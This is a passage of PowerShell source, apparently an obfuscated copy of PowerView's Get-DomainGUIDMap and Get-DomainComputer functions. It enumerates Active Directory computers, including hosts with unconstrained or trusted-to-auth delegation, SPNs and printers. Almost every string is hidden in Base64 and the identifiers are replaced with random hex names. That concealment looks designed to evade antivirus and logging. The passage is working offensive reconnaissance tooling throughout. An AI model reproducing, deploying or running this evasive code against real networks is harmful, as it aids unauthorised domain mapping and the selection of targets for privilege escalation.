    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${0bce9337f17f4d28841ad52072ae14d1} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
    if (${0bce9337f17f4d28841ad52072ae14d1}) {
        try {
            ${c1d2f3b775df48dfbe092797965c6f30} = ${0bce9337f17f4d28841ad52072ae14d1}.FindAll()
            ${c1d2f3b775df48dfbe092797965c6f30} | Where-Object {$_} | ForEach-Object {
                ${4ec6a424a697407eb189b374cdcb24a9}[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if (${c1d2f3b775df48dfbe092797965c6f30}) {
                try { ${c1d2f3b775df48dfbe092797965c6f30}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                }
            }
            ${0bce9337f17f4d28841ad52072ae14d1}.dispose()
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGkAbgAgAGIAdQBpAGwAZABpAG4AZwAgAEcAVQBJAEQAIABtAGEAcAA6ACAAJABfAA==')))
        }
    }
    ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = ${984cc0865e5942c69831cd16ed70dbc1}.replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBtAGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAC0AUgBpAGcAaAB0AHMA'))))
    ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBjAG8AbgB0AHIAbwBsAEEAYwBjAGUAcwBzAFIAaQBnAGgAdAApAA==')))
    ${e7b3aa3c39c04942b7cccde8d5e321d7} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
    if (${e7b3aa3c39c04942b7cccde8d5e321d7}) {
        try {
            ${c1d2f3b775df48dfbe092797965c6f30} = ${e7b3aa3c39c04942b7cccde8d5e321d7}.FindAll()
            ${c1d2f3b775df48dfbe092797965c6f30} | Where-Object {$_} | ForEach-Object {
                ${4ec6a424a697407eb189b374cdcb24a9}[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if (${c1d2f3b775df48dfbe092797965c6f30}) {
                try { ${c1d2f3b775df48dfbe092797965c6f30}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                }
            }
            ${e7b3aa3c39c04942b7cccde8d5e321d7}.dispose()
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGkAbgAgAGIAdQBpAGwAZABpAG4AZwAgAEcAVQBJAEQAIABtAGEAcAA6ACAAJABfAA==')))
        }
    }
    ${4ec6a424a697407eb189b374cdcb24a9}
}
function cec1def5409041f78ed8ecd436f7fa52 {
    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $Identity,
        [Switch]
        ${a641242359464a5bb75a49b867c183a4},
        [Switch]
        ${c0a475f4a80d4b3f8d340cbdeab0d2d1},
        [Switch]
        ${ef29230dfa6148aca4eb7833d781e949},
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        ${ad4b28078d594068abb862a63d64bc33},
        [ValidateNotNullOrEmpty()]
        [String]
        ${de1879a6375144efa1511357bfecd42f},
        [ValidateNotNullOrEmpty()]
        [String]
        ${b0dd23003b9d4473818f6e8c6cc2e082},
        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,
        [Switch]
        ${a40c582ae44f42a9a5b09dc8f788446f},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        ${598368791be24354b9a053d51b7a6598} = [Enum]::GetNames(${ad9be41dbd0943c2b70046d95a560c23})
        ${598368791be24354b9a053d51b7a6598} = ${598368791be24354b9a053d51b7a6598} | ForEach-Object {$_; $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAkAF8A')))}
        bef71dfb45ba46c1b577a61e7f67f221 -Name UACFilter -ValidateSet ${598368791be24354b9a053d51b7a6598} -c8f42b8a5203479ba051f687fab516f8 ([array])
    }
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${d131b16e921b4fa598afb42f46f41422} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            bef71dfb45ba46c1b577a61e7f67f221 -CreateVariables -BoundParameters $PSBoundParameters
        }
        if (${d131b16e921b4fa598afb42f46f41422}) {
            ${fb29aaa2f9c140909efae41cb42f1bef} = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                ${56aaa31f880a49e195bcf739ac331528} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${56aaa31f880a49e195bcf739ac331528} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewA1ADYAYQBhAGEAMwAxAGYAOAA4ADAAYQA0ADkAZQAxADkANQBiAGMAZgA3ADMAOQBhAGMAMwAzADEANQAyADgAfQApAA==')))
                }
                elseif (${56aaa31f880a49e195bcf739ac331528} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${7eef0517afe94597af8ab4be39a72451} = ${56aaa31f880a49e195bcf739ac331528}.SubString(${56aaa31f880a49e195bcf739ac331528}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7ADcAZQBlAGYAMAA1ADEANwBhAGYAZQA5ADQANQA5ADcAYQBmADgAYQBiADQAYgBlADMAOQBhADcAMgA0ADUAMQB9ACcAIABmAHIAbwBtACAAJwAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AJwA=')))
                        ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${7eef0517afe94597af8ab4be39a72451}
                        ${d131b16e921b4fa598afb42f46f41422} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
                        if (-not ${d131b16e921b4fa598afb42f46f41422}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAHIAYwBoAGUAcgAgAGYAbwByACAAJwAkAHsANwBlAGUAZgAwADUAMQA3AGEAZgBlADkANAA1ADkANwBhAGYAOABhAGIANABiAGUAMwA5AGEANwAyADQANQAxAH0AJwA=')))
                        }
                    }
                }
                elseif (${56aaa31f880a49e195bcf739ac331528}.Contains('.')) {
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAbgBhAG0AZQA9ACQAewA1ADYAYQBhAGEAMwAxAGYAOAA4ADAAYQA0ADkAZQAxADkANQBiAGMAZgA3ADMAOQBhAGMAMwAzADEANQAyADgAfQApACgAZABuAHMAaABvAHMAdABuAGEAbQBlAD0AJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACkAKQA=')))
                }
                elseif (${56aaa31f880a49e195bcf739ac331528} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    ${a58a88389bba4f499974f2986992284e} = (([Guid]${56aaa31f880a49e195bcf739ac331528}).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AGEANQA4AGEAOAA4ADMAOAA5AGIAYgBhADQAZgA0ADkAOQA5ADcANABmADIAOQA4ADYAOQA5ADIAMgA4ADQAZQB9ACkA')))
                }
                else {
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACkA')))
                }
            }
            if (${fb29aaa2f9c140909efae41cb42f1bef} -and (${fb29aaa2f9c140909efae41cb42f1bef}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBmAGIAMgA5AGEAYQBhADIAZgA5AGMAMQA0ADAAOQAwADkAZQBmAGEAZQA0ADEAYwBiADQAMgBmADEAYgBlAGYAfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAGYAbwByACAAdQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAAgAGQAZQBsAGUAZwBhAHQAaQBvAG4A')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADUAMgA0ADIAOAA4ACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZABUAG8AQQB1AHQAaAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdABoAGEAdAAgAGEAcgBlACAAdAByAHUAcwB0AGUAZAAgAHQAbwAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlACAAZgBvAHIAIABvAHQAaABlAHIAIABwAHIAaQBuAGMAaQBwAGEAbABzAA==')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAHMAZABzAC0AYQBsAGwAbwB3AGUAZAB0AG8AZABlAGwAZQBnAGEAdABlAHQAbwA9ACoAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgB0AGUAcgBzAA==')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAHAAcgBpAG4AdABlAHIAcwA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBwAHIAaQBuAHQAUQB1AGUAdQBlACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBQAE4A')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAFMAUABOADoAIAAkAHsAYQBkADQAYgAyADgAMAA3ADgAZAA1ADkANAAwADYAOABhAGIAYgA4ADYAMgBhADYAMwBkADYANABiAGMAMwAzAH0A')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGUAcgB2AGkAYwBlAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAPQAkAHsAYQBkADQAYgAyADgAMAA3ADgAZAA1ADkANAAwADYAOABhAGIAYgA4ADYAMgBhADYAMwBkADYANABiAGMAMwAzAH0AKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAG8AcABlAHIAYQB0AGkAbgBnACAAcwB5AHMAdABlAG0AOgAgACQAewBkAGUAMQA4ADcAOQBhADYAMwA3ADUAMQA0ADQAZQBmAGEAMQA1ADEAMQAzADUANwBiAGYAZQBjAGQANAAyAGYAfQA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQA9ACQAewBkAGUAMQA4ADcAOQBhADYAMwA3ADUAMQA0ADQAZQBmAGEAMQA1ADEAMQAzADUANwBiAGYAZQBjAGQANAAyAGYAfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAHMAZQByAHYAaQBjAGUAIABwAGEAYwBrADoAIAAkAHsAYgAwAGQAZAAyADMAMAAwADMAYgA5AGQANAA0ADcAMwA4ADEAOABmADYAZQA4AGMANgBjAGMAMgBlADAAOAAyAH0A')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQBzAGUAcgB2AGkAYwBlAHAAYQBjAGsAPQAkAHsAYgAwAGQAZAAyADMAMAAwADMAYgA5AGQANAA0ADcAMwA4ADEAOABmADYAZQA4AGMANgBjAGMAMgBlADAAOAAyAH0AKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAHMAaQB0AGUAIABuAGEAbQBlADoAIAAkAFMAaQB0AGUATgBhAG0AZQA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGUAcgB2AGUAcgByAGUAZgBlAHIAZQBuAGMAZQBiAGwAPQAkAFMAaQB0AGUATgBhAG0AZQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAVQBzAGkAbgBnACAAYQBkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6ACAAJABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAuACoA')))) {
                    ${834edd590d404d47a0f82b91e88597ca} = $_.Substring(4)
                    ${f2105d7958054e66951a27fa8dd3e8bb} = [Int](${ad9be41dbd0943c2b70046d95a560c23}::${834edd590d404d47a0f82b91e88597ca})
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAkAHsAZgAyADEAMAA1AGQANwA5ADUAOAAwADUANABlADYANgA5ADUAMQBhADIANwBmAGEAOABkAGQAMwBlADgAYgBiAH0AKQApAA==')))
                }
                else {
                    ${f2105d7958054e66951a27fa8dd3e8bb} = [Int](${ad9be41dbd0943c2b70046d95a560c23}::$_)
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ACQAewBmADIAMQAwADUAZAA3ADkANQA4ADAANQA0AGUANgA2ADkANQAxAGEAMgA3AGYAYQA4AGQAZAAzAGUAOABiAGIAfQApAA==')))
                }
            }
            ${d131b16e921b4fa598afb42f46f41422}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADkAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $(${d131b16e921b4fa598afb42f46f41422}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${c1d2f3b775df48dfbe092797965c6f30} = ${d131b16e921b4fa598afb42f46f41422}.FindOne() }
            else { ${c1d2f3b775df48dfbe092797965c6f30} = ${d131b16e921b4fa598afb42f46f41422}.FindAll() }
            ${c1d2f3b775df48dfbe092797965c6f30} | Where-Object {$_} | ForEach-Object {
                ${d7b577ae558c406581a98832155768ff} = $True
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABpAG4AZwA=')))]) {
                    ${d7b577ae558c406581a98832155768ff} = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                }
                if (${d7b577ae558c406581a98832155768ff}) {
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                        ${a9e149a622e146cb8c4c690f286bb4b0} = $_
                        ${a9e149a622e146cb8c4c690f286bb4b0}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIALgBSAGEAdwA='))))
                    }
                    else {
                        ${a9e149a622e146cb8c4c690f286bb4b0} = ac8c47b8977f4b0f9b4bbd3cb21b1a28 -Properties $_.Properties
                        ${a9e149a622e146cb8c4c690f286bb4b0}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIA'))))
                    }
                    ${a9e149a622e146cb8c4c690f286bb4b0}
                }
            }
            if (${c1d2f3b775df48dfbe092797965c6f30}) {
                try { ${c1d2f3b775df48dfbe092797965c6f30}.dispose() }
                catch {
